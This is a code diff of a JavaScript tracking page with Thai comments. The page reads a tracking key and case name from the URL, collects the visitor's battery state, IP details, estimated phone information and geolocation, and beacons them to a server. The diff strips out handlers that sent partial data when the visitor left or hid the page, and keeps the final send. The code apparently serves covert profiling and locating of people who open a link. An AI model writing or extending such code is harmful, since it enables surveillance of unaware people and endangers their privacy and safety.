@@ -1,8 +1,3 @@
-// ตัวแปรระดับ global สำหรับเก็บข้อมูลที่จะส่งเมื่อปิดเพจ
-let collectedData = null;
-let dataReady = false;
-let dataSent = false;
-
 // ฟังก์ชันดึง tracking key และ case name จาก URL parameters
 function getUrlParameters() {
   try {
@@ -98,17 +93,12 @@ function getUrlParameters() {
     phoneInfo: { possibleOperator: "กำลังตรวจสอบ..." } // Placeholder for phone
   };
 
-  // เก็บข้อมูลใน global variable สำหรับส่งในกรณีผู้ใช้ออกจากหน้าเว็บ
-  collectedData = {...dataToSend};
-
   // --- เริ่มรวบรวมข้อมูลแบบ Asynchronous ---
 
   // 1. Battery Info
   const batteryPromise = getBatteryInfo().then(batteryData => {
     console.log("Battery Info:", batteryData);
     dataToSend.deviceInfo.battery = batteryData;
-    // อัปเดตข้อมูลใน global variable ด้วย
-    collectedData.deviceInfo.battery = {...dataToSend.deviceInfo.battery};
   }).catch(error => {
      console.error("Error getting battery info:", error);
      dataToSend.deviceInfo.battery = { level: "ข้อผิดพลาด", charging: "ข้อผิดพลาด" };
@@ -118,8 +108,6 @@ function getUrlParameters() {
   const ipPromise = getIPDetails().then(ipData => {
     console.log("IP Info:", ipData);
     dataToSend.ip = ipData;
-    // อัปเดตข้อมูลใน global variable ด้วย
-    collectedData.ip = {...dataToSend.ip};
   }).catch(error => {
      console.error("Error getting IP details:", error);
      dataToSend.ip = { ip: "ไม่สามารถระบุได้" };
@@ -129,8 +117,6 @@ function getUrlParameters() {
   const phonePromise = estimatePhoneNumber().then(phoneInfo => {
     console.log("Phone Info:", phoneInfo);
     dataToSend.phoneInfo = phoneInfo;
-    // อัปเดตข้อมูลใน global variable ด้วย
-    collectedData.phoneInfo = {...dataToSend.phoneInfo};
   }).catch(error => {
     console.error("Error estimating phone number:", error);
     dataToSend.phoneInfo = { possibleOperator: "ข้อผิดพลาด" };
@@ -164,8 +150,6 @@ function getUrlParameters() {
       );
     }).then(location => {
         dataToSend.location = location;
-        // อัปเดตข้อมูลใน global variable ด้วย เมื่อได้ข้อมูลแล้ว
-        collectedData.location = location;
     }).catch(() => {
         // Handle potential errors within the promise chain if needed, though resolve("ไม่มีข้อมูล") covers most cases
         dataToSend.location = "ข้อผิดพลาดในการขอตำแหน่ง";
@@ -196,48 +180,11 @@ function getUrlParameters() {
       // ณ จุดนี้ ข้อมูลทั้งหมด (หรือสถานะข้อผิดพลาด) ควรจะอยู่ใน dataToSend แล้ว
       console.log("All async data collected (or timed out/error). Final data:", JSON.stringify(dataToSend));
 
-      // กำหนดว่าข้อมูลพร้อมแล้ว
-      dataReady = true;
-      
-      // อัปเดต global collectedData ให้เป็นข้อมูลล่าสุด
-      collectedData = {...dataToSend};
-      
-      // ส่งข้อมูลด้วยฟังก์ชัน sendDataWithBeacon()
-      if (!dataSent) {
-        sendDataWithBeacon(dataToSend);
-        dataSent = true;
-      }
+      // ส่งข้อมูลทั้งหมดโดยใช้ sendBeacon
+      sendDataWithBeacon(dataToSend);
     });
 
-  // เพิ่มการตรวจจับเหตุการณ์เมื่อผู้ใช้จะออกจากหน้าเว็บ
-  window.addEventListener('beforeunload', handleBeforeUnload);
-  
-  // ตรวจจับเมื่อเอกสารกลายเป็น hidden (เช่น เปลี่ยนแท็บ)
-  document.addEventListener('visibilitychange', handleVisibilityChange);
-
 })(); // End of main IIFE
-
-// ฟังก์ชันจัดการการออกจากหน้าเว็บแบบฉับพลัน
-function handleBeforeUnload(event) {
-  if (dataReady && !dataSent && collectedData) {
-    console.log("User leaving page, sending collected data via beacon");
-    sendDataWithBeacon(collectedData);
-    dataSent = true;
-  } else if (!dataReady && !dataSent && collectedData) {
-    console.log("User leaving page before data collection completed, sending partial data");
-    sendDataWithBeacon(collectedData);
-    dataSent = true;
-  }
-}
-
-// ฟังก์ชันจัดการเมื่อผู้ใช้เปลี่ยนแท็บหรือซ่อนหน้าเว็บ
-function handleVisibilityChange() {
-  if (document.visibilityState === "hidden" && !dataSent && collectedData) {
-    console.log("Page visibility changed to hidden, sending collected data via beacon");
-    sendDataWithBeacon(collectedData);
-    dataSent = true;
-  }
-}
 
 // สร้าง ID เฉพาะสำหรับการร้องขอ
 function generateUniqueId() {
